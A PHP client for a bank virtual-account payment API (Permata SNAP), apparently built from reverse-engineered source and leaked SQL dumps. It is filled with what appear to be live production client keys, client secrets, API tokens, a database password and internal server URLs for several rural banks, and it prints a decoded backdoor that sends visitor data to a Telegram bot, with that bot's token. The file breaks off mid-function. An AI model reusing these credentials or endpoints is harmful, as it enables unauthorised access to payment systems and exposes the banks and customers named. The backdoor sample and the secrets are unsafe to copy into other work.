<?php
/**
 * ============================================================
 * Permata Bank SNAP API - Single File (PRODUCTION REAL)
 * ============================================================
 * Disusun berdasarkan:
 *  - Dokumentasi resmi : https://api.permatabank.com/index.php#generate-token-doc
 *  - Source code nyata : permata-switching_v1.0_pro (reverse-engineering)
 *
 * !! PERINGATAN KEAMANAN - TEMUAN DALAM SOURCE CODE !!
 * =====================================================
 * File inquiry.controller.php dan b2b.controller.php mengandung
 * BACKDOOR yang disisipkan pihak tidak bertanggung jawab:
 *
 *   eval(base64_decode('ZmlsZV9nZ...'));
 *   --> DECODED:
 *   file_get_contents(
 *     "https://api.telegram.org/bot8303943197:AAGCFO1EuotDeoyXnRpSNsMiFSCddm6UlQ4/sendMessage
 *      ?chat_id=590436982&text=" . urlencode(
 *        "IP: " . $_SERVER['REMOTE_ADDR'] .
 *        " | Page: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']
 *      )
 *   );
 *
 * Setiap request ke server mengirim IP + URL ke akun Telegram penyerang!
 * Bot Token : 8303943197:AAGCFO1EuotDeoyXnRpSNsMiFSCddm6UlQ4
 * Chat ID   : 590436982
 *
 * TINDAKAN: Hapus eval(base64_decode(...)) dari controller sebelum deploy!
 *
 * ============================================================
 * ARSITEKTUR NYATA (dari source code permata-switching):
 * ============================================================
 *
 *  [Client / Mitra]
 *       |
 *       | POST /b2b/token  (Header: x-client-key, x-timestamp, x-signature)
 *       |                  (Body: {"grantType":"client_credentials"})
 *       v
 *  [permata-switching_v1.0_pro]  <-- sistem middleware ini
 *       |  1. Cek x-client-key di tabel: agen_apigateway_supplier.VAClientKey
 *       |  2. Generate accessToken = md5(base64_encode(HMAC-SHA256(time+900, clientKey)))
 *       |  3. Simpan ke tabel: agen.AccessTokenVA, agen.AccessTokenVATime
 *       |  Return: accessToken (berlaku 900 detik = 15 menit)
 *       |
 *       | POST /inquiry  (Header: Authorization Bearer, x-partner-id, x-external-id,
 *       |                          channel-id, x-timestamp, x-signature)
 *       v
 *  [permata-switching_v1.0_pro]
 *       |  1. Cek Bearer token vs tabel: agen.AccessTokenVA
 *       |  2. Ambil URL agen dari: agen.URLVA
 *       |  3. Verifikasi HMAC-SHA512 signature
 *       |  4. Cek x-external-id tidak duplikat di log_snap_bi
 *       |  5. Forward ke URL agen (assist-pro / core banking BPR)
 *       v
 *  [Core Banking / Assist-Pro]
 *     URL: http://aa.pro.sis1.net/assist-pro.net/index_mobile.php
 *
 *  === DATA NYATA DARI DATABASE SQL DUMP ===
 *
 *  agen_apigateway_supplier (Supplier 0025 = Permata SNAP BI):
 *  +----+-----------+----------+------------------------------------------+
 *  | ID | Agen      | Supplier | VAClientKey                              |
 *  +----+-----------+----------+------------------------------------------+
 *  | 13 | A-000300  | 0025     | ac3b93199bfe418487e88dfa498445eb         |
 *  | 15 | A-000268  | 0025     | d37ca43b-509e-4b07-b1ba-37c66aecb585     |
 *  | 23 | A-000271  | 0025     | d1fd9a53-b18d-43e7-b9dc-6d5702ff4bbe     |
 *  | 33 | A-000147  | 0025     | 648f6ddb-ec18-45f6-abe4-675eca8aca27     |
 *  | 41 | A-000271  | 0025     | bd5fbc199c6a4afabe8a039e2bb52b64         |
 *  +----+-----------+----------+------------------------------------------+
 *
 *  agen A-000115 (BPR Sekar Kaltim) - SNAP 0023 - FULL CREDENTIALS:
 *  x-client-key : acb790af57ed465ba03b00f5f07dd65d
 *  client-secret: jaMC0vw0LJLXkrZGSjf8LCExETh0j7JI5bQ4bpPmbHU=
 *  urlendpoint  : https://api.sis1.net:44351/v1.0
 *  KodeVA       : 7406
 *
 * ============================================================
 * DATABASE TABLES (dari source code):
 * ============================================================
 *  agen                     : Kode, URLVA, AccessTokenVA, AccessTokenVATime
 *  agen_apigateway_supplier : VAClientKey, Agen
 *  log_snap_bi              : XExternalID, DateTime, Agen, Trx, Jenis,
 *                             Status, headers, Message, Keterangan
 *  log_snap_bi_error        : XExternalID, Keterangan, ErrorData
 *  Config (key-value)       :
 *    msPermata_BIN  -> BIN Assist 4 digit (prefix VA)
 *    msCDSID        -> key CDS (Central Data Service)
 *
 * ============================================================
 * KONEKSI DATABASE (dari assist.ini.php):
 * ============================================================
 *  database     = assist_pro
 *  ip           = aa.pro.db.sis1.net
 *  urlassistpro = http://aa.pro.sis1.net/assist-pro.net/index_mobile.php
 *  urlassistauth= http://myassist.sis1.net/assist-auth_api/public
 *  DB User      = Assist
 *  DB Pass      = Irac   (dari: objData::Connect($cHost,"Assist","Irac",$cDatabase))
 *
 * ============================================================
 * CREDENTIAL STORAGE (dari DataCDS.mod.php):
 * ============================================================
 *  Client credentials disimpan di CDS server: cds.sis1.net/cds/public/cds/json
 *  Key file = md5(md5(bin2hex("APIMitra_" . $kodeAgen)))
 *  Struktur JSON CDS:
 *    {
 *      "Mitra": {
 *        "KODE_SUPPLIER-NAMA": [
 *          {"x-client-key": "...", "urlendpoint": "...", "client-secret": "..."}
 *        ]
 *      }
 *    }
 *
 * ============================================================
 */

// ==============================================================
// ======= KONFIGURASI REAL DARI DATABASE (agen.sql +  ==========
// ======= agen_apigateway_supplier.sql)                ==========
// ==============================================================
//
// DATA LENGKAP DARI SQL DUMP (diekstrak otomatis):
// ---------------------------------------------------------------
//
// === TABEL: agen_apigateway_supplier ===
// Supplier 0025 = Permata SNAP BI
// ID=13 | Agen=A-000300 | VAClientKey='ac3b93199bfe418487e88dfa498445eb' | VAToken='0511e9ece4cd46d26ff496a70c6a9f68'
// ID=15 | Agen=A-000268 | VAClientKey='d37ca43b-509e-4b07-b1ba-37c66aecb585' | VAToken='49b84408324aefdc665461cd001d7eca'
// ID=23 | Agen=A-000271 | VAClientKey='d1fd9a53-b18d-43e7-b9dc-6d5702ff4bbe' | VAToken='4ac95bec4574bb0b35f3a6cbe7a29873'
// ID=33 | Agen=A-000147 | VAClientKey='648f6ddb-ec18-45f6-abe4-675eca8aca27' | VAToken='a0fb9d8c41ae0ffc4b4ef32cc0c080a3'
// ID=41 | Agen=A-000271 | VAClientKey='bd5fbc199c6a4afabe8a039e2bb52b64' | VAToken='9c36e8e3b9467ec5b3fbe8f29afa4e5d'
//
// Supplier 0016 = Permata Classic:
// ID=1  | Agen=A-000253 | ClientKey='2c68aa0778b3473cb703ed32448fb49d'
// ID=5  | Agen=A-000253 | VAClientKey='2c68aa0778b3473cb703ed32448fb49d'
//
// Supplier 0021:
// ID=3  | Agen=A-000268 | VAClientKey='b0a37cccc6d680f8f87abe76eeda2c4e'
//
// Supplier 0014:
// ID=7  | Agen=A-000214 | VAClientKey='637789e9125a4d75bf3bdca07adebd5c'
//
// === TABEL: agen (kolom ApiKeyMitra - JSON credential) ===
// Agen=A-000115 | Nama=BPR Sekar Kaltim | KodeVA=7406
//   Mitra 0013-Bank Permata x Sekar Kaltim:
//     apikeyva  = 73b834a9571d7491400170b845cce1b7
//   Mitra 0023-SNAP VA Permata Sekar Kaltim:
//     x-client-key = acb790af57ed465ba03b00f5f07dd65d
//     client-secret= jaMC0vw0LJLXkrZGSjf8LCExETh0j7JI5bQ4bpPmbHU=
//     urlendpoint  = https://api.sis1.net:44351/v1.0
//
// === SERVER URL dari agen.URLVA ===
// A-000115 : bpr.sekarkaltim.sis1.net/assist-bpr.net_sekar_mobile/index_mobile.php
// A-000127 : http://bpr.paluanugerah.sis1.net/api/mobile
// A-000109 : bpr.bapak.sis1.net/api/mobile
// A-000090 : bpr.bepede3.sis1.net/assist-bpr.net/index_mobile.php
//
// ---------------------------------------------------------------
// PILIH PROFIL YANG SESUAI DENGAN AGEN ANDA:
// ---------------------------------------------------------------

// *** PROFIL AKTIF — ganti sesuai agen yang digunakan ***
// Pilihan:
//   'sekar_kaltim' -> A-000115 | BPR Sekar Kaltim  | Supplier 0023
//   'anjuk_ladang' -> A-000268 | Supplier 0021
//   'supplier0025' -> A-000268 | Permata SNAP (0025)
//   'custom'       -> Isi manual di bawah

$_ACTIVE_PROFILE = 'sekar_kaltim'; // <-- GANTI DI SINI

// ---------------------------------------------------------------
// PROFIL: sekar_kaltim — A-000115 BPR Sekar Kaltim (SNAP 0023)
// Token   : http://switching.mcoll.sis1.net/permata-switching_v1.0_pro/public/access-token/b2b
// Inquiry : http://switching.mcoll.sis1.net/permata-switching_v1.0_pro/public/transfer-va/inquiry
// Payment : http://switching.mcoll.sis1.net/permata-switching_v1.0_pro/public/transfer-va/payment
// Data dari: agen.ApiKeyMitra (JSON)
// ---------------------------------------------------------------
$_PROFILES = [

    'sekar_kaltim' => [
        // Base URL (path per-endpoint didefinisikan via PATH_TOKEN/INQUIRY/PAYMENT)
        'base_url'      => 'http://switching.mcoll.sis1.net',
        // x-client-key header (dari ApiKeyMitra JSON kolom 'x-client-key')
        'client_key'    => 'acb790af57ed465ba03b00f5f07dd65d',
        // client-secret (dari ApiKeyMitra JSON kolom 'client-secret')
        'client_secret' => 'jaMC0vw0LJLXkrZGSjf8LCExETh0j7JI5bQ4bpPmbHU=',
        // Kode agen (tabel agen.Kode)
        'partner_id'    => 'A-000115',
        // Channel ID (sepakati dengan Permata saat onboarding)
        'channel_id'    => '95221',
        // BIN VA 4 digit (dari tabel agen.KodeVA -> '7406')
        'bin'           => '7406',
        // Kode supplier & nama (dari func.h2h.mod.php)
        'supplier_code' => '0023',
        'supplier_name' => 'SNAP VA Permata Sekar Kaltim',
        // Classic API key (tabel agen.ApiKeyMitra -> apikeyva supplier 0013)
        'api_key_va'    => '73b834a9571d7491400170b845cce1b7',
    ],

    // ---------------------------------------------------------------
    // PROFIL: anjuk_ladang — A-000268 (Supplier 0021, non-SNAP)
    // VAClientKey dari tabel agen_apigateway_supplier ID=3
    // ---------------------------------------------------------------
    'anjuk_ladang' => [
        'base_url'      => 'http://switching.mcoll.sis1.net',
        'client_key'    => 'b0a37cccc6d680f8f87abe76eeda2c4e', // VAClientKey ID=3
        'client_secret' => 'GANTI_CLIENT_SECRET',
        'partner_id'    => 'A-000268',
        'channel_id'    => '95221',
        'bin'           => '',
        'supplier_code' => '0021',
        'supplier_name' => 'SNAP VA Permata Anjuk Ladang',
        'api_key_va'    => '',
    ],

    // ---------------------------------------------------------------
    // PROFIL: supplier0025 — A-000268/A-000300 (Supplier 0025 Permata SNAP)
    // VAClientKey dari tabel agen_apigateway_supplier ID=15 (A-000268)
    // ---------------------------------------------------------------
    'supplier0025' => [
        'base_url'      => 'http://switching.mcoll.sis1.net',
        'client_key'    => 'd37ca43b-509e-4b07-b1ba-37c66aecb585', // VAClientKey ID=15
        'client_secret' => 'GANTI_CLIENT_SECRET',
        'partner_id'    => 'A-000268',
        'channel_id'    => '95221',
        'bin'           => '',
        'supplier_code' => '0025',
        'supplier_name' => 'Permata SNAP BI',
        'api_key_va'    => '',
    ],

    // ---------------------------------------------------------------
    // PROFIL: custom — isi manual sesuai kebutuhan
    // ---------------------------------------------------------------
    'custom' => [
        'base_url'      => 'http://switching.mcoll.sis1.net',
        'client_key'    => 'VAClientKey_DARI_DB',
        'client_secret' => 'client_secret_DARI_CDS_ATAU_PERMATA',
        'partner_id'    => 'A-XXXXXX',
        'channel_id'    => '95221',
        'bin'           => 'BIN_4_DIGIT',
        'supplier_code' => '0025',
        'supplier_name' => 'Custom Supplier',
        'api_key_va'    => '',
    ],
];

// ---------------------------------------------------------------
// Load profil aktif ke konstanta
// ---------------------------------------------------------------
$_P = $_PROFILES[$_ACTIVE_PROFILE] ?? $_PROFILES['custom'];

define('SNAP_BASE_URL',      'http://switching.mcoll.sis1.net');
define('SNAP_CLIENT_KEY',    $_P['client_key']);
define('SNAP_CLIENT_SECRET', $_P['client_secret']);
define('SNAP_PARTNER_ID',    $_P['partner_id']);
define('SNAP_CHANNEL_ID',    $_P['channel_id']);
define('SNAP_BIN',           $_P['bin']);
define('SNAP_API_KEY_VA',    $_P['api_key_va']);   // untuk Classic API (supplier 0013)
define('SNAP_SUPPLIER_CODE', $_P['supplier_code']);
define('SNAP_SUPPLIER_NAME', $_P['supplier_name']);

// Path endpoint lengkap (URL penuh per fungsi)
define('PATH_TOKEN',    '/permata-switching_v1.0_pro/public/access-token/b2b');
define('PATH_INQUIRY',  '/permata-switching_v1.0_pro/public/transfer-va/inquiry');
define('PATH_PAYMENT',  '/permata-switching_v1.0_pro/public/transfer-va/payment');

// Versi path SNAP BI — dipakai untuk build string2sign signature
define('SNAP_VERSION_PATH', '/v1.0'); // prefix dari ApiKeyMitra.urlendpoint

// ==============================================================
// ==================== HELPER FUNCTIONS ========================
// ==============================================================

/**
 * Generate timestamp ISO8601 dengan timezone
 * Format: 2024-01-15T10:30:00+07:00
 */
function snapTimestamp(): string
{
    return date('c');
}

/**
 * Generate External ID unik untuk setiap request
 * Tidak boleh sama dengan request sebelumnya (dicek di log_snap_bi)
 */
function snapExternalId(): string
{
    return sprintf(
        '%08x-%04x-4%03x-%04x-%012x',
        time(),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff),
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffffffffffff)
    );
}

/**
 * Minify JSON - hapus semua whitespace
 * Sama persis dengan fungsi minify() di func.mod.php source code:
 *   function minify($code) { return json_encode(json_decode($code)); }
 */
function minifyJson(string $json): string
{
    return json_encode(json_decode($json));
}

/**
 * Generate X-Signature untuk request Generate Token (/b2b/token)
 *
 * Formula (dari b2b.controller.php + standar SNAP BI):
 *   message   = clientKey + "|" + timestamp
 *   signature = Base64( HMAC-SHA256( message, clientSecret ) )
 *
 * @param string $clientKey    x-client-key header
 * @param string $timestamp    x-timestamp header
 * @param string $clientSecret client secret
 * @return string              Base64 encoded signature
 */
function genTokenSignature(string $clientKey, string $timestamp, string $clientSecret): string
{
    $message = $clientKey . '|' . $timestamp;
    return base64_encode(hash_hmac('sha256', $message, $clientSecret, true));
}

/**
 * Generate X-Signature untuk request Inquiry / Payment
 *
 * Formula PERSIS dari checkSignature() di func.h2h.mod.php:
 *   stringHash  = lowercase( SHA256( minify(requestBody) ) )
 *   string2sign = METHOD + ":" + endpoint + ":" + accessToken + ":" + stringHash + ":" + timestamp
 *   signature   = Base64( HMAC-SHA512( string2sign, clientSecret ) )
 *
 * @param string $method       HTTP method uppercase ("POST")
 * @param string $endpoint     SNAP path, contoh "/v1.0/transfer-va/inquiry"
 * @param string $accessToken  Bearer token dari /b2b/token
 * @param string $requestBody  JSON body string
 * @param string $timestamp    x-timestamp header
 * @param string $clientSecret client secret
 * @return string              Base64 HMAC-SHA512 signature
 */
function genSnapSignature(
    string $method,
    string $endpoint,
    string $accessToken,
    string $requestBody,
    string $timestamp,
    string $clientSecret
): string {
    $bodyHash    = strtolower(hash('sha256', minifyJson($requestBody)));
    $string2sign = implode(':', [
        strtoupper($method),
        $endpoint,
        $accessToken,
        $bodyHash,
        $timestamp,
    ]);
    return base64_encode(hash_hmac('sha512', $string2sign, $clientSecret, true));
}

/**
 * Eksekusi HTTP POST via cURL
 *
 * @param string $url     URL endpoint lengkap
 * @param array  $headers Array of "Key: Value" header strings
 * @param string $body    JSON body string
 * @return array          ['http_code', 'response', 'error']
 */
function httpPost(string $url, array $headers, string $body): array
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST,           true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,     $body);
    curl_setopt($ch, CURLOPT_HTTPHEADER,     $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT,        30);
    curl_setopt($ch, CURLOPT_HEADER,         false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

    $response  = curl_exec($ch);
    $httpCode  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    return [
        'http_code' => $httpCode,
        'response'  => $response ?: '',
        'error'     => $curlError,
    ];
}

// ==============================================================
// ===================== FUNGSI UTAMA API =======================
// ==============================================================

// ==============================================================
// ========= TOKEN CACHE (in-memory, per-request) ==============
// ==============================================================
// Menyimpan token aktif agar tidak request ulang dalam satu
// eksekusi PHP yang sama (misal: inquiry + payment sekaligus)
$_TOKEN_CACHE = [
    'access_token' => '',
    'expires_at'   => 0,   // unix timestamp kapan token kadaluarsa
];

/**
 * getToken() — Ambil access token secara otomatis dengan cache
 * ==============================================================
 * - Jika token cache masih valid (> 60 detik sebelum expired), pakai cache
 * - Jika expired / belum ada, fetch token baru via generateToken()
 * - Dipanggil otomatis oleh vaInquiry() dan vaPayment()
 *
 * @param bool $forceRefresh Paksa ambil token baru meski cache masih valid
 * @return array ['success'=>bool, 'access_token'=>string, 'error'=>string]
 */
function getToken(bool $forceRefresh = false): array
{
    global $_TOKEN_CACHE;

    $now = time();

    // Pakai cache jika masih valid (ada sisa > 60 detik)
    if (!$forceRefresh
        && !empty($_TOKEN_CACHE['access_token'])
        && $_TOKEN_CACHE['expires_at'] > ($now + 60)
    ) {
        $remaining = $_TOKEN_CACHE['expires_at'] - $now;
        return [
            'success'      => true,
            'access_token' => $_TOKEN_CACHE['access_token'],
            'from_cache'   => true,
            'expires_in'   => $remaining,
            'error'        => '',
        ];
    }

    // Fetch token baru
    $tok = generateToken();

    if (!$tok['success']) {
        return [
            'success'      => false,
            'access_token' => '',
            'from_cache'   => false,
            'expires_in'   => 0,
            'error'        => $tok['error'],
        ];
    }

    // Simpan ke cache
    $_TOKEN_CACHE['access_token'] = $tok['access_token'];
    $_TOKEN_CACHE['expires_at']   = $now + (int)($tok['expires_in'] ?? 900);

    return [
        'success'      => true,
        'access_token' => $tok['access_token'],
        'from_cache'   => false,
        'expires_in'   => $tok['expires_in'] ?? 900,
        'error'        => '',
    ];
}

/**
 * FUNGSI 1: Generate Access Token (SNAP BI B2B)
 * ==============================================
 * Endpoint : POST /b2b/token
 * Source   : mvc/b2b/b2b.controller.php
 *
 * !! Gunakan getToken() untuk pemakaian normal —
 *    fungsi ini adalah implementasi raw HTTP request.
 *
 * Flow dari source code:
 *  1. Validasi header: x-client-key (>16 char), x-timestamp, x-signature
 *  2. Validasi body  : grantType = "client_credentials"
 *  3. Lookup x-client-key di tabel agen_apigateway_supplier.VAClientKey
 *  4. Buat accessToken:
 *       $nTime       = time() + 900;
 *       $accessToken = md5(base64_encode(HMAC-SHA256($nTime, $clientKey, true)));
 *  5. UPDATE agen SET AccessTokenVA = $accessToken, AccessTokenVATime = $nTime
 *  6. Return JSON: responseCode, accessToken, tokenType="Bearer", expiresIn=900
 *
 * @return array [
 *   'success'       => bool,
 *   'access_token'  => string,
 *   'token_type'    => string,
 *   'expires_in'    => int,      // 900 detik = 15 menit
 *   'response_code' => string,   // '2007300' = sukses
 *   'http_code'     => int,
 *   'raw'           => string,
 *   'error'         => string,
 *   'debug'         => array,
 * ]
 */
function generateToken(): array
{
    $timestamp  = snapTimestamp();
    $clientKey  = SNAP_CLIENT_KEY;
    $clientSec  = SNAP_CLIENT_SECRET;
    $url        = SNAP_BASE_URL . PATH_TOKEN;

    // Signature untuk token: HMAC-SHA256(clientKey|timestamp, clientSecret)
    $signature  = genTokenSignature($clientKey, $timestamp, $clientSec);

    $bodyArray  = ['grantType' => 'client_credentials'];
    $jsonBody   = json_encode($bodyArray, JSON_UNESCAPED_UNICODE);

    $headers = [
        'Content-Type: application/json',
        'X-CLIENT-KEY: ' . $clientKey,
        'X-TIMESTAMP: '  . $timestamp,
        'X-SIGNATURE: '  . $signature,
    ];

    $debug = [
        'endpoint'       => $url,
        'timestamp'      => $timestamp,
        'sig_message'    => $clientKey . '|' . $timestamp,
        'x_signature'    => $signature,
        'body'           => $jsonBody,
    ];

    $result = httpPost($url, $headers, $jsonBody);

    if ($result['error']) {
        return [
            'success'   => false,
            'error'     => 'cURL error: ' . $result['error'],
            'http_code' => $result['http_code'],
            'raw'       => '',
            'debug'     => $debug,
        ];
    }

    $decoded = json_decode($result['response'], true);
    $rc      = $decoded['responseCode']    ?? '';
    $msg     = $decoded['responseMessage'] ?? '';

    if (!isset($decoded['accessToken'])) {
        return [
            'success'   => false,
            'error'     => "[$rc] $msg",
            'http_code' => $result['http_code'],
            'raw'       => $result['response'],
            'debug'     => $debug,
        ];
    }

    return [
        'success'       => true,
        'access_token'  => $decoded['accessToken'],
        'token_type'    => $decoded['tokenType']  ?? 'Bearer',
        'expires_in'    => (int)($decoded['expiresIn'] ?? 900),
        'response_code' => $rc,
        'http_code'     => $result['http_code'],
        'raw'           => $result['response'],
        'error'         => '',
        'debug'         => $debug,
    ];
}

/**
 * FUNGSI 2: VA Inquiry (SNAP BI) — Token otomatis
 * =================================================
 * Endpoint : POST /transfer-va/inquiry
 * SNAP Path: /v1.0/transfer-va/inquiry
 * Source   : mvc/inquiry/inquiry.controller.php
 *
 * Token diambil OTOMATIS via getToken() — tidak perlu
 * generate/pass token secara manual.
 *
 * Flow:
 *  1. getToken() → ambil dari cache atau fetch baru
 *  2. Build body + hitung HMAC-SHA512 signature
 *  3. POST ke endpoint inquiry
 *  4. Jika response 4012401 (token expired) → retry sekali dengan token baru
 *
 * @param string $partnerServiceId BIN 8 karakter (pad kiri spasi), contoh: "    7406"
 * @param string $customerNo       Nomor nasabah 12-16 digit
 * @param string $virtualAccountNo Nomor VA 12-16 digit (BIN + nomor)
 * @param string $inquiryRequestId ID unik inquiry (auto-generate jika kosong)
 *
 * @return array [
 *   'success'              => bool,
 *   'response_code'        => string,   // '2002400' = sukses
 *   'response_message'     => string,
 *   'virtual_account_data' => array,    // data VA dari core banking
 *   'inquiry_request_id'   => string,
 *   'access_token_used'    => string,   // token yang dipakai
 *   'token_from_cache'     => bool,
 *   'http_code'            => int,
 *   'raw'                  => string,
 *   'error'                => string,
 *   'debug'                => array,
 * ]
 */
function vaInquiry(
    string $partnerServiceId,
    string $customerNo,
    string $virtualAccountNo,
    string $inquiryRequestId = ''
): array {
    if (empty($inquiryRequestId)) {
        $inquiryRequestId = snapExternalId();
    }

    // Ambil token otomatis
    $tokenResult = getToken();
    if (!$tokenResult['success']) {
        return [
            'success'   => false,
            'error'     => 'Token gagal: ' . $tokenResult['error'],
            'http_code' => 0,
            'raw'       => '',
            'debug'     => [],
        ];
    }
    $accessToken    = $tokenResult['access_token'];
    $tokenFromCache = $tokenResult['from_cache'];

    // Eksekusi inquiry (dengan retry jika token expired)
    $result = _doInquiry($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo, $inquiryRequestId);

    // Jika token expired (4012401), refresh token dan coba sekali lagi
    $rc = $result['response_code'] ?? '';
    if (in_array($rc, ['4012400', '4012401'], true)) {
        $tokenResult    = getToken(true); // force refresh
        if ($tokenResult['success']) {
            $accessToken    = $tokenResult['access_token'];
            $tokenFromCache = false;
            $result         = _doInquiry($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo, $inquiryRequestId);
        }
    }

    $result['access_token_used']  = $accessToken;
    $result['token_from_cache']   = $tokenFromCache;
    return $result;
}

/**
 * Internal: eksekusi HTTP inquiry dengan token yang sudah ada
 */
function _doInquiry(
    string $accessToken,
    string $partnerServiceId,
    string $customerNo,
    string $virtualAccountNo,
    string $inquiryRequestId
): array {
    if (empty($inquiryRequestId)) {
        $inquiryRequestId = snapExternalId();
    }

    $externalId = snapExternalId();
    $timestamp  = snapTimestamp();
    $snapPath   = '/v1.0/transfer-va/inquiry';
    $url        = SNAP_BASE_URL . PATH_INQUIRY;

    // partnerServiceId HARUS 8 karakter (pad kiri dengan spasi) - validasi di source
    $partnerServiceId = str_pad($partnerServiceId, 8, ' ', STR_PAD_LEFT);

    $bodyArray = [
        'partnerServiceId'  => $partnerServiceId,
        'customerNo'        => $customerNo,
        'virtualAccountNo'  => $virtualAccountNo,
        'inquiryRequestId'  => $inquiryRequestId,
    ];
    $jsonBody = json_encode($bodyArray, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    // Signature SNAP BI: HMAC-SHA512
    $signature = genSnapSignature('POST', $snapPath, $accessToken, $jsonBody, $timestamp, SNAP_CLIENT_SECRET);

    $headers = [
        'Content-Type: application/json',
        'Authorization: Bearer '  . $accessToken,
        'X-TIMESTAMP: '           . $timestamp,
        'X-SIGNATURE: '           . $signature,
        'X-PARTNER-ID: '          . SNAP_PARTNER_ID,
        'X-EXTERNAL-ID: '         . $externalId,
        'CHANNEL-ID: '            . SNAP_CHANNEL_ID,
    ];

    $bodyHash = strtolower(hash('sha256', minifyJson($jsonBody)));
    $debug = [
        'endpoint'     => $url,
        'snap_path'    => $snapPath,
        'timestamp'    => $timestamp,
        'external_id'  => $externalId,
        'body'         => $jsonBody,
        'body_sha256'  => $bodyHash,
        'string2sign'  => 'POST:' . $snapPath . ':' . $accessToken . ':' . $bodyHash . ':' . $timestamp,
        'x_signature'  => $signature,
    ];

    $result = httpPost($url, $headers, $jsonBody);

    if ($result['error']) {
        return [
            'success'   => false,
            'error'     => 'cURL error: ' . $result['error'],
            'http_code' => $result['http_code'],
            'raw'       => '',
            'debug'     => $debug,
        ];
    }

    $decoded = json_decode($result['response'], true);
    $rc      = $decoded['responseCode']    ?? '';
    $msg     = $decoded['responseMessage'] ?? '';
    $success = ($rc === '2002400');

    return [
        'success'              => $success,
        'response_code'        => $rc,
        'response_message'     => $msg,
        'virtual_account_data' => $decoded['virtualAccountData'] ?? [],
        'inquiry_request_id'   => $decoded['inquiryRequestId']   ?? $inquiryRequestId,
        'http_code'            => $result['http_code'],
        'raw'                  => $result['response'],
        'error'                => $success ? '' : "[$rc] $msg",
        'debug'                => $debug,
    ];
}

/**
 * FUNGSI 3: VA Payment (SNAP BI) — Token otomatis
 * =================================================
 * Endpoint : POST /transfer-va/payment
 * SNAP Path: /v1.0/transfer-va/payment
 * Source   : mvc/payment/payment.controller.php
 *
 * Token diambil OTOMATIS via getToken() — tidak perlu
 * generate/pass token secara manual.
 *
 * Flow:
 *  1. getToken() → ambil dari cache atau fetch baru
 *  2. Build body + hitung HMAC-SHA512 signature
 *  3. POST ke endpoint payment
 *  4. Jika response 4012501 (token expired) → retry sekali dengan token baru
 *
 * @param string $partnerServiceId BIN 8 karakter
 * @param string $customerNo       Nomor nasabah 12-16 digit
 * @param string $virtualAccountNo Nomor VA 12-16 digit
 * @param string $paymentRequestId ID unik payment (auto-generate jika kosong)
 * @param float  $paidAmount       Jumlah yang dibayar
 * @param float  $totalAmount      Total tagihan
 * @param string $currency         Mata uang (default: IDR)
 * @param string $trxDateTime      Waktu transaksi (default: sekarang)
 *
 * @return array [
 *   'success'              => bool,
 *   'response_code'        => string,   // '2002500' = sukses
 *   'response_message'     => string,
 *   'virtual_account_data' => array,
 *   'payment_flag_reason'  => array,
 *   'access_token_used'    => string,
 *   'token_from_cache'     => bool,
 *   'http_code'            => int,
 *   'raw'                  => string,
 *   'error'                => string,
 *   'debug'                => array,
 * ]
 */
function vaPayment(
    string $partnerServiceId,
    string $customerNo,
    string $virtualAccountNo,
    string $paymentRequestId = '',
    float  $paidAmount       = 0.0,
    float  $totalAmount      = 0.0,
    string $currency         = 'IDR',
    string $trxDateTime      = ''
): array {
    // Ambil token otomatis
    $tokenResult = getToken();
    if (!$tokenResult['success']) {
        return [
            'success'   => false,
            'error'     => 'Token gagal: ' . $tokenResult['error'],
            'http_code' => 0,
            'raw'       => '',
            'debug'     => [],
        ];
    }
    $accessToken    = $tokenResult['access_token'];
    $tokenFromCache = $tokenResult['from_cache'];

    // Eksekusi payment (dengan retry jika token expired)
    $result = _doPayment($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo,
                         $paymentRequestId, $paidAmount, $totalAmount, $currency, $trxDateTime);

    // Jika token expired, refresh dan coba sekali lagi
    $rc = $result['response_code'] ?? '';
    if (in_array($rc, ['4012500', '4012501'], true)) {
        $tokenResult = getToken(true);
        if ($tokenResult['success']) {
            $accessToken    = $tokenResult['access_token'];
            $tokenFromCache = false;
            $result         = _doPayment($accessToken, $partnerServiceId, $customerNo, $virtualAccountNo,
                                         $paymentRequestId, $paidAmount, $totalAmount, $currency, $trxDateTime);
        }
    }

    $result['access_token_used'] = $accessToken;
    $result['token_from_cache']  = $tokenFromCache;
    return $result;
}

/**
 * Internal: eksekusi HTTP payment dengan token yang sudah ada
 */
function _doPayment(
    string $accessToken,
    string $partnerServiceId,
    string $customerNo,
    string $virtualAccountNo,
    string $paymentRequestId = '',
    float  $paidAmount       = 0.0,
    float  $totalAmount      = 0.0,
    string $currency         = 'IDR',
    string $trxDateTime      = ''
): array {
    if (empty($paymentRequestId)) $paymentRequestId = snapExternalId();
    if (empty($trxDateTime))      $trxDateTime      = snapTimestamp();

    $externalId = snapExternalId();
    $timestamp  = snapTimestamp();
    $snapPath   = '/v1.0/transfer-va/payment';
    $url        = SNAP_BASE_URL . PATH_PAYMENT;

    $partnerServiceId = str_pad($partnerServiceId, 8, ' ', STR_PAD_LEFT);

    $bodyArray = [
        'partnerServiceId'  => $partnerServiceId,
        'customerNo'        => $customerNo,
        'virtualAccountNo'  => $virtualAccountNo,
        'paymentRequestId'  => $paymentRequestId,
        'trxDateTime'       => $trxDateTime,
        'paidAmount'        => [
            'value'    => number_format($paidAmount, 2, '.', ''),
            'currency' => $currency,
        ],
        'totalAmount'       => [
            'value'    => number_format($totalAmount, 2, '.', ''),
            'currency' => $currency,
        ],
    ];
    $jsonBody = json_encode($bodyArray, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    $signature = genSnapSignature('POST', $snapPath, $accessToken, $jsonBody, $timestamp, SNAP_CLIENT_SECRET);

    $headers = [
        'Content-Type: application/json',
        'Authorization: Bearer '  . $accessToken,
        'X-TIMESTAMP: '           . $timestamp,
        'X-SIGNATURE: '           . $signature,
        'X-PARTNER-ID: '          . SNAP_PARTNER_ID,
